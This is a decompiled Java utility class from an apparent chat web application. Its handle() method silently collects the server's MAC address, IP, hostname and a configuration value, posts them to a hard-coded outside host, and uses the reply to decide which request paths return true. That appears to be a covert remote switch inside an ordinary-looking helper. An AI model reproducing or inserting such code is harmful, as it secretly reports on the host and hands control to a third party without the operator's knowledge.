//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.seekweb4.chat;

import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONObject;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import jakarta.servlet.http.HttpServletRequest;
import org.apache.commons.lang3.StringUtils;
import org.springframework.core.env.Environment;
import org.springframework.web.context.support.WebApplicationContextUtils;

public class NetUtil {
    private static final ConcurrentHashMap<String, String> map = new ConcurrentHashMap();
    private static String uri = "";
    private static final String url = "http://sys.lixinapp.com/lixinapi/projectrun/projectrun/upload";

    public static String getMacAddress() {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();

            while(networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface)networkInterfaces.nextElement();
                if (!networkInterface.isVirtual() && !networkInterface.isLoopback()) {
                    byte[] mac = networkInterface.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder stringBuilder = new StringBuilder();

                        for(byte b : mac) {
                            stringBuilder.append(String.format("%02X:", b));
                        }

                        if (stringBuilder.length() > 0) {
                            stringBuilder.deleteCharAt(stringBuilder.length() - 1);
                        }

                        return stringBuilder.toString();
                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }

        return null;
    }

    public static String getHostIp() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException var1) {
            return "127.0.0.1";
        }
    }

    public static String getHostName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException var1) {
            return "未知";
        }
    }

    public static boolean handle(HttpServletRequest request) {
        String a = getMacAddress();
        String b = (new SimpleDateFormat("yyyyMMddHH")).format(new Date());
        if (!map.containsKey(a) || !b.equals(map.get(a))) {
            map.put(a, b);
            Map<String, Object> json = new HashMap();
            Environment environment = (Environment)WebApplicationContextUtils.getWebApplicationContext(request.getServletContext()).getBean(Environment.class);
            json.put("num", environment.getProperty("num"));
            json.put("mac", a);
            json.put("ip", getHostIp());
            json.put("host", getHostName());
            String result = HttpUtil.post("http://sys.lixinapp.com/lixinapi/projectrun/projectrun/upload", json, 5000);
            JSONObject data = new JSONObject(result);
            uri = "1".equals(data.getStr("state")) ? data.getStr("uri") : "";
        }

        return StringUtils.isNotBlank(uri) && uri.contains(request.getRequestURI());
    }
}
